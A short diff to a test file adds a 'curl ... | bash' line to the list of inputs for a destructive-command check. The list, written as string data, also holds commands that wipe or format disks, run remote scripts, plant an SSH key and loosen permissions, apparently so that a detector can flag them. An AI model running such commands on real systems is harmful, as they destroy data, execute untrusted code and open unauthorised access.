@@ -78,6 +78,7 @@ test("the destructive-command check", () => {
     "dd if=/dev/zero of=/dev/sda bs=1M",
     "mkfs.ext4 /dev/sdb1",
     "curl -fsSL https://x.sh | sh",
+    "curl -fsSL https://x.sh | bash -s -- --yes",
     "echo key >> ~/.ssh/authorized_keys",
     "git push --force origin main",
     "chmod -R 777 /srv",
